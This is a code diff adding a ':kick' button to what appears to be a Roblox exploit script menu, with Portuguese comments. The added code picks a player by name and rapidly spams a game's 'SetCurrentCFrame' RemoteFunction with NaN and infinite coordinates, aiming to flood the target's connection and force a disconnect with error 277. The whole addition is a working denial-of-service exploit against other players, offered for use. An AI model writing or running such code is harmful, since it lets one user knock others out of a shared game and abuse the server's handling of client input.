@@ -541,6 +541,73 @@ MainTab:Button({
     end
 })
 
+-- ============================================================
+-- RECURSO: :netkick (Provoca desconexão por Erro 277 no alvo)
+-- ============================================================
+MainTab:Button({
+    Title = ":kick",
+    Desc = "Disconnected. Please check your internet and try again. Erro Code 277",
+    Callback = function()
+        if AlvoSelecionado ~= "" then
+            local Players = game:GetService("Players")
+            local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")
+            
+            local targetPlayer = nil
+            for _, player in pairs(Players:GetPlayers()) do
+                if string.find(string.lower(player.Name), string.lower(AlvoSelecionado)) or string.find(string.lower(player.DisplayName), string.lower(AlvoSelecionado)) then
+                    targetPlayer = player
+                    break
+                end
+            end
+            
+            if targetPlayer and targetPlayer.Character then
+                WindUI:Notify({
+                    Title = "🌐 PromptR Rede", 
+                    Content = "Inundando o buffer de replicação de " .. targetPlayer.Name .. "...", 
+                    Duration = 3
+                })
+
+                local trafficCones = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones")
+                if trafficCones then
+                    -- Dispara uma sequência de alta velocidade para saturar a conexão do alvo
+                    task.spawn(function()
+                        local props = trafficCones:GetChildren()
+                        -- Valores matemáticos que quebram o interpretador de vetores (NaN)
+                        local dadoCorrompido = CFrame.new(0/0, math.huge, 0/0) 
+                        
+                        -- Executa ciclos repetidos para garantir que a fila de rede dele caia
+                        for ciclo = 1, 15 do
+                            if not targetPlayer or targetPlayer.Parent ~= Players then break end
+                            
+                            for _, prop in pairs(props) do
+                                local setCFrame = prop:FindFirstChild("SetCurrentCFrame")
+                                if setCFrame and setCFrame:IsA("RemoteFunction") then
+                                    -- O spam assíncrono impede que o seu próprio jogo sinta o lag
+                                    task.spawn(function()
+                                        pcall(function()
+                                            setCFrame:InvokeServer(dadoCorrompido)
+                                        end)
+                                    end)
+                                end
+                            end
+                            -- Pequena pausa para manter o fluxo de pacotes ativo sem travar você
+                            task.wait(0.05) 
+                        end
+                        
+                        WindUI:Notify({Title = "✅ Concluído", Content = "Ataque de rede finalizado.", Duration = 3})
+                    end)
+                else
+                    WindUI:Notify({Title = "❌ Erro", Content = "Pasta de Props não localizada.", Duration = 3})
+                end
+            else
+                WindUI:Notify({Title = "❌ Erro", Content = "Infrator offline.", Duration = 3})
+            end
+        else
+            WindUI:Notify({Title = "⚠️ PromptR", Content = "Digite o nome do invasor antes de desconectar!", Duration = 3})
+        end
+    end
+})
+
 MainTab:Button({
     Title = ":bring",
     Desc = "Teleporta os cones para a perna; se sentar, traz a cadeira até você, limpa os props e para",
